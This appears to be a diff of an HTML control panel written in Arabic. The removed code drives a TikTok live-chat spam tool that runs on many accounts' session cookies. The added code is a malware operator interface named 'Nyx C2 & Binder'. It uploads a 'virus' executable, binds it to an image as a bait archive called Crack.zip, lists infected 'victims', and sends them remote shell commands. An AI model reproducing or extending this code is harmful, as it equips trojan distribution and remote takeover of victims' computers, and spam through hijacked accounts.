@@ -3,275 +3,152 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>nyx</title>
+<title>Nyx C2 & Binder</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: -apple-system, "SF Pro", system-ui, sans-serif;
-    background: #0a0a0a; color: #e8e8e8; min-height: 100vh;
-    padding: 16px; display: flex; justify-content: center; }
-  .wrap { width: 100%; max-width: 500px; }
-  .head { display: flex; align-items: center; justify-content: space-between;
-    margin-bottom: 16px; }
-  h1 { font-size: 20px; font-weight: 600; }
-  .dot { width: 10px; height: 10px; border-radius: 50%;
-    background: #333; transition: all 0.2s; }
-  .dot.on { background: #4ade80; box-shadow: 0 0 10px #4ade80; }
-  .card { background: #141414; border: 1px solid #222;
-    border-radius: 12px; padding: 14px; margin-bottom: 10px; }
-  label { display: block; font-size: 10px; color: #777;
-    margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.6px; }
-  input, textarea { width: 100%; background: #0a0a0a; border: 1px solid #262626;
-    border-radius: 8px; padding: 10px 12px; color: #e8e8e8;
-    font-size: 14px; font-family: inherit; margin-bottom: 10px; }
-  input:focus, textarea:focus { outline: none; border-color: #4a7dff; }
-  textarea { resize: vertical; min-height: 80px;
-    font-family: ui-monospace, monospace; font-size: 11px; }
-  .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-  button { width: 100%; padding: 13px; border: none; border-radius: 8px;
-    font-size: 14px; font-weight: 600; cursor: pointer;
-    font-family: inherit; transition: opacity 0.15s; }
-  button:active { transform: scale(0.98); }
-  button:disabled { opacity: 0.35; }
-  .btn-primary { background: #4a7dff; color: #fff; margin-bottom: 8px; }
-  .btn-check { background: #f59e0b; color: #000; margin-bottom: 8px; }
-  .start { background: #4ade80; color: #000; margin-bottom: 8px; }
-  .stop { background: #ff3b3b; color: #fff; }
-  .stats { display: grid; grid-template-columns: repeat(3, 1fr);
-    gap: 8px; margin-bottom: 10px; }
-  .stat { background: #0a0a0a; border: 1px solid #222;
-    border-radius: 8px; padding: 10px; text-align: center; }
-  .stat .v { font-size: 18px; font-weight: 700;
-    font-variant-numeric: tabular-nums; }
-  .stat .l { font-size: 9px; color: #666; margin-top: 2px; }
-  .stat.ok .v { color: #4ade80; }
-  .stat.err .v { color: #ff3b3b; }
-  .accs { background: #0a0a0a; border: 1px solid #222;
-    border-radius: 8px; padding: 10px; font-size: 11px;
-    max-height: 200px; overflow-y: auto; }
-  .acc { padding: 8px 0; border-bottom: 1px solid #1a1a1a;
-    display: flex; flex-direction: column; gap: 4px;
-    font-family: ui-monospace, monospace; }
-  .acc:last-child { border: none; }
-  .acc .row { display: flex; justify-content: space-between; }
-  .acc .name { color: #666; }
-  .acc .num { color: #4ade80; }
-  .acc .num.bad { color: #ff3b3b; }
-  .acc .err { color: #ff5555; font-size: 10px; word-break: break-all; }
-  .info { background: #0a0a0a; border: 1px solid #2a2a2a;
-    border-radius: 8px; padding: 12px; font-size: 12px;
-    margin-bottom: 10px; line-height: 1.6; display: none; }
-  .info.show { display: block; }
-  .info.ok { border-color: #4ade80; color: #4ade80; }
-  .info.err { border-color: #ff3b3b; color: #ff5555; }
-  .toast { position: fixed; bottom: 20px; left: 50%;
-    transform: translateX(-50%) translateY(120px);
-    background: #1e1e1e; border: 1px solid #2a2a2a;
-    padding: 10px 18px; border-radius: 8px; font-size: 13px;
-    transition: transform 0.25s; pointer-events: none; z-index: 99; }
-  .toast.show { transform: translateX(-50%) translateY(0); }
-  .toast.err { border-color: #ff3b3b; color: #ff5555; }
-  .toast.ok { border-color: #4ade80; color: #4ade80; }
+    body { background: #0a0a0a; color: #e8e8e8; font-family: monospace; padding: 20px; }
+    .card { background: #141414; border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
+    h2, h3 { color: #4ade80; margin-bottom: 10px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+    th, td { padding: 8px; text-align: right; border-bottom: 1px solid #222; }
+    th { color: #666; }
+    .btn { background: #4a7dff; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; margin-top: 5px; font-family: inherit;}
+    .btn-green { background: #4ade80; color: #000; font-weight: bold; }
+    .btn-red { background: #ff3b3b; color: white; }
+    input[type="text"], input[type="file"] { width: 100%; padding: 8px; background: #0a0a0a; color: white; border: 1px solid #333; border-radius: 4px; margin-bottom: 10px; box-sizing: border-box; font-family: inherit;}
+    pre { background: #000; padding: 10px; overflow-x: auto; color: #4ade80; max-height: 200px; white-space: pre-wrap;}
+    .nav { display: flex; gap: 10px; margin-bottom: 20px; }
+    .nav button { flex: 1; padding: 12px; font-size: 16px; }
+    .hidden { display: none; }
 </style>
 </head>
 <body>
-<div class="wrap">
-  <div class="head">
-    <h1>nyx</h1>
-    <div class="dot" id="dot"></div>
-  </div>
-
-  <div class="card">
-    <label>server</label>
-    <input id="api" placeholder="https://your-app.onrender.com" style="margin-bottom:0" />
-  </div>
-
-  <div class="card">
-    <label>رابط البث (أي شكل — يتحقق تلقائياً)</label>
-    <input id="room" placeholder="https://www.tiktok.com/@user/live  أو  vt.tiktok.com/..." />
-    <label>الرسالة</label>
-    <input id="msg" placeholder="نص الرسالة" value="nyx" style="margin-bottom:0" />
-  </div>
-
-  <div class="card">
-    <button class="btn-check" id="b-check" onclick="checkLive()">فحص البث أولاً</button>
-    <div class="info" id="info"></div>
-  </div>
-
-  <div class="card">
-    <div class="row2">
-      <div>
-        <label>threads / حساب</label>
-        <input id="threads" type="number" value="1" min="1" style="margin-bottom:0" />
-      </div>
-      <div>
-        <label>interval (ث)</label>
-        <input id="interval" type="number" value="0.3" step="0.1" min="0.1" style="margin-bottom:0" />
-      </div>
+    <h2>Nyx Control Panel</h2>
+    
+    <div class="nav">
+        <button class="btn" onclick="showTab('binder')">صانع الملفات (Binder)</button>
+        <button class="btn" onclick="showTab('control')">التحكم بالضحايا (C2)</button>
     </div>
-  </div>
 
-  <div class="card">
-    <label>الحسابات — كل سطر: cookie|csrf</label>
-    <textarea id="accs" placeholder="sessionid=...; tt-target-idc=...; ttwid=...; msToken=...|csrf
-sessionid=...; tt-target-idc=...; ttwid=...; msToken=...|csrf"></textarea>
-  </div>
+    <!-- Binder Tab -->
+    <div id="binder-tab" class="card">
+        <h3>1. ارفع الفايروس (client.exe) للسيرفر</h3>
+        <input type="file" id="exe-upload" accept=".exe">
+        <button class="btn" onclick="uploadExe()">رفع الفايروس</button>
+        <span id="exe-status" style="color:#4ade80; margin-right:10px;"></span>
+        
+        <hr style="border-color:#222; margin:20px 0;">
 
-  <div class="card">
-    <div class="stats">
-      <div class="stat"><div class="v" id="s-sent">0</div><div class="l">مرسل</div></div>
-      <div class="stat ok"><div class="v" id="s-ok">0</div><div class="l">نجح</div></div>
-      <div class="stat err"><div class="v" id="s-err">0</div><div class="l">فشل</div></div>
+        <h3>2. اصنع الملف الخادع (Bait)</h3>
+        <input type="file" id="img-upload" accept="image/*">
+        <button class="btn btn-green" onclick="buildPayload()">توليد ملف الضحية (ZIP)</button>
+        <div id="download-link" style="margin-top:10px;"></div>
     </div>
-    <button class="start" id="b-start" onclick="start()">تشغيل</button>
-    <button class="stop" id="b-stop" onclick="stop()" disabled>إيقاف</button>
-  </div>
 
-  <div class="card" id="accs-card" style="display:none">
-    <label>الحسابات النشطة</label>
-    <div class="accs" id="accs-list"></div>
-  </div>
-</div>
-
-<div class="toast" id="toast"></div>
-
-<script>
-const $ = id => document.getElementById(id);
-let api = localStorage.getItem("nyx_api") || "";
-$("api").value = api;
-
-function saveApi() {
-  api = $("api").value.replace(/\/+$/, "");
-  localStorage.setItem("nyx_api", api);
-}
-
-function toast(m, t = "ok") {
-  const el = $("toast");
-  el.textContent = m;
-  el.className = "toast show " + t;
-  clearTimeout(el._h);
-  el._h = setTimeout(() => el.className = "toast " + t, 2400);
-}
-
-async function req(path, opts = {}) {
-  saveApi();
-  if (!api) throw new Error("حط عنوان السيرفر أول");
-  const r = await fetch(api + path, opts);
-  if (!r.ok) throw new Error("HTTP " + r.status);
-  return r.json();
-}
-
-function showInfo(msg, type) {
-  const el = $("info");
-  el.className = "info show " + type;
-  el.textContent = msg;
-}
-
-async function checkLive() {
-  const room = $("room").value.trim();
-  if (!room) return toast("حط رابط البث", "err");
-  $("b-check").disabled = true;
-  showInfo("جاري الفحص...", "ok");
-  try {
-    const j = await req("/check", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ room })
-    });
-    if (j.ok) {
-      showInfo(`✅ البث شغال — room_id: ${j.room_id}\nالعنوان: ${j.title || "بدون عنوان"}`, "ok");
-      toast("البث لايف ✅");
-    } else {
-      showInfo("❌ " + (j.error || "فشل الفحص"), "err");
-      toast("البث مو لايف أو الرابط غلط", "err");
-    }
-  } catch (e) {
-    showInfo("❌ " + e.message, "err");
-    toast(e.message, "err");
-  } finally {
-    $("b-check").disabled = false;
-  }
-}
-
-function readAccounts() {
-  return $("accs").value.split("\n").filter(l => l.trim()).map(l => {
-    const [c, s] = l.split("|");
-    return { cookie: (c || "").trim(), csrf: (s || "").trim() };
-  }).filter(a => a.cookie);
-}
-
-async function start() {
-  const payload = {
-    room: $("room").value.trim(),
-    msg: $("msg").value.trim(),
-    threads: parseInt($("threads").value) || 1,
-    interval: parseFloat($("interval").value) || 0.3,
-    accounts: readAccounts(),
-  };
-  if (!payload.room) return toast("حط رابط البث", "err");
-  if (!payload.msg) return toast("حط الرسالة", "err");
-  if (!payload.accounts.length) return toast("حط حساب واحد على الأقل", "err");
-
-  $("b-start").disabled = true;
-  toast("جاري التحقق من البث...");
-  try {
-    const j = await req("/run", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-    if (j.ok) {
-      toast(`اشتغل — ${j.workers} worker على ${j.accounts} حساب`);
-      $("b-stop").disabled = false;
-    } else {
-      toast(j.error || "فشل", "err");
-      showInfo("❌ " + (j.error || "فشل"), "err");
-      $("b-start").disabled = false;
-    }
-  } catch (e) {
-    toast(e.message, "err");
-    $("b-start").disabled = false;
-  }
-  refresh();
-}
-
-async function stop() {
-  try {
-    await req("/stop", { method: "POST" });
-    toast("تم الإيقاف");
-    $("b-start").disabled = false;
-    $("b-stop").disabled = true;
-  } catch (e) { toast(e.message, "err"); }
-  refresh();
-}
-
-async function refresh() {
-  if (!api) { $("dot").className = "dot"; return; }
-  try {
-    const s = await req("/status");
-    $("dot").className = "dot " + (s.running ? "on" : "");
-    $("s-sent").textContent = s.totals.sent;
-    $("s-ok").textContent = s.totals.ok;
-    $("s-err").textContent = s.totals.err;
-    $("b-start").disabled = s.running;
-    $("b-stop").disabled = !s.running;
-
-    if (s.accounts && s.accounts.length) {
-      $("accs-card").style.display = "block";
-      $("accs-list").innerHTML = s.accounts.map((a, i) => `
-        <div class="acc">
-          <div class="row">
-            <span class="name">#${i+1} ${a.cookie}</span>
-            <span class="num ${a.err > a.ok ? 'bad' : ''}">${a.ok}/${a.sent}</span>
-          </div>
-          ${a.last_err ? `<div class="err">${a.last_err}</div>` : ""}
+    <!-- C2 Tab -->
+    <div id="control-tab" class="card hidden">
+        <h3>الضحايا المتصلين</h3>
+        <table id="clients-table">
+            <thead><tr><th>ID</th><th>النظام</th><th>آخر اتصال</th><th>التحكم</th></tr></thead>
+            <tbody></tbody>
+        </table>
+        
+        <div id="cmd-area" class="hidden" style="margin-top:20px; border-top: 1px solid #333; padding-top: 15px;">
+            <h3>التحكم في <span id="active-id" style="color:#fff;"></span></h3>
+            <input type="text" id="cmd-input" placeholder="اكتب أمر CMD (مثال: dir, whoami, ipconfig)">
+            <button class="btn" onclick="sendCmd()">إرسال الأمر</button>
+            <h3>النتيجة:</h3>
+            <pre id="output">في انتظار النتيجة...</pre>
         </div>
-      `).join("");
-    }
-  } catch (e) { $("dot").className = "dot"; }
-}
+    </div>
 
-refresh();
-setInterval(refresh, 3000);
-</script>
+    <script>
+        function showTab(tab) {
+            document.getElementById('binder-tab').style.display = tab === 'binder' ? 'block' : 'none';
+            document.getElementById('control-tab').style.display = tab === 'control' ? 'block' : 'none';
+        }
+
+        // --- Binder Logic ---
+        async function uploadExe() {
+            const fileInput = document.getElementById('exe-upload');
+            if (!fileInput.files.length) return alert("اختر ملف exe أولاً");
+            const formData = new FormData();
+            formData.append("file", fileInput.files[0]);
+            
+            document.getElementById('exe-status').innerText = "جاري الرفع...";
+            const res = await fetch('/upload_exe', { method: 'POST', body: formData });
+            const data = await res.json();
+            if (data.ok) document.getElementById('exe-status').innerText = "تم رفع الفايروس بنجاح ✅";
+            else alert("فشل الرفع");
+        }
+
+        async function buildPayload() {
+            const fileInput = document.getElementById('img-upload');
+            if (!fileInput.files.length) return alert("اختر صورة أولاً");
+            const formData = new FormData();
+            formData.append("image", fileInput.files[0]);
+            
+            document.getElementById('download-link').innerHTML = "جاري التجهيز...";
+            const res = await fetch('/build', { method: 'POST', body: formData });
+            
+            if (res.ok) {
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                document.getElementById('download-link').innerHTML = `<a href="${url}" download="Crack.zip" style="color:#4ade80; font-weight:bold; font-size:18px; text-decoration:none;">⬇️ تحميل ملف الضحية (Crack.zip)</a>`;
+            } else {
+                alert("حدث خطأ، تأكد من رفع الفايروس أولاً");
+                document.getElementById('download-link').innerHTML = "";
+            }
+        }
+
+        // --- C2 Logic ---
+        let activeId = null;
+        
+        function loadClients() {
+            fetch('/api/clients').then(r => r.json()).then(data => {
+                const tbody = document.querySelector('#clients-table tbody');
+                tbody.innerHTML = '';
+                for (const [id, info] of Object.entries(data)) {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `<td>${id.substring(0,8)}</td><td>${info.os}</td><td>${info.last_seen}</td>
+                    <td><button class="btn" onclick="selectClient('${id}')">تحكم</button></td>`;
+                    tbody.appendChild(tr);
+                }
+            });
+        }
+        
+        function selectClient(id) {
+            activeId = id;
+            document.getElementById('active-id').innerText = id.substring(0,8);
+            document.getElementById('cmd-area').classList.remove('hidden');
+            document.getElementById('output').innerText = 'في انتظار النتيجة...';
+            getResult();
+        }
+        
+        function sendCmd() {
+            const cmd = document.getElementById('cmd-input').value;
+            if(!cmd || !activeId) return;
+            fetch('/api/send_cmd/' + activeId, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({cmd: cmd})
+            }).then(() => {
+                document.getElementById('cmd-input').value = '';
+                document.getElementById('output').innerText = 'تم إرسال الأمر، بانتظار الرد...';
+            });
+        }
+        
+        function getResult() {
+            if(!activeId) return;
+            fetch('/api/get_result/' + activeId).then(r => r.json()).then(data => {
+                if(data.result) {
+                    document.getElementById('output').innerText = data.result;
+                }
+            });
+            setTimeout(getResult, 2000); // تحديث كل ثانيتين
+        }
+        
+        setInterval(loadClients, 3000);
+        loadClients();
+    </script>
 </body>
 </html>
